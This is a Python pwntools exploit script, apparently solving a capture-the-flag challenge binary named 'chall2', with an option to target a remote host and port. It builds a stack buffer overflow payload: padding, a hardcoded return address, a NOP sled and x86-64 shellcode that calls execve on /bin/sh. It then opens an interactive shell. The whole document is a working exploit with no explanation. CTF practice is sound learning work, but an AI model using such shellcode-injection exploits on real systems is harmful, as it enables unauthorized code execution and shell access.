#!/usr/bin/env python3
from pwn import *

# Definitions
e = context.binary = ELF('./chall2', checksec=False)
context.terminal = ['terminator', '-e']

if args.REMOTE:
    io = remote('209.126.8.12', 1338)
else:
    io = process(e.path)

# Exploit
shellcode = asm(
    'xor rsi, rsi;'
    'xor rdx, rdx;'
    'push rsi;'
    'mov rdi, 0x68732f2f6e69622f;'
    'push rdi;'
    'push rsp;'
    'pop rdi;'
    'xor rax, rax;'
    'mov al, 59;'
    'syscall;'
)
shellcode_addr = p64(0x7fffffffdca8)

def pwn():
    payload = 56*b'A'
    payload += shellcode_addr
    payload += 256*b'\x90'
    payload += shellcode
    
    gdb.attach(io)
    io.sendlineafter('plz\n', payload)

pwn()
io.interactive()
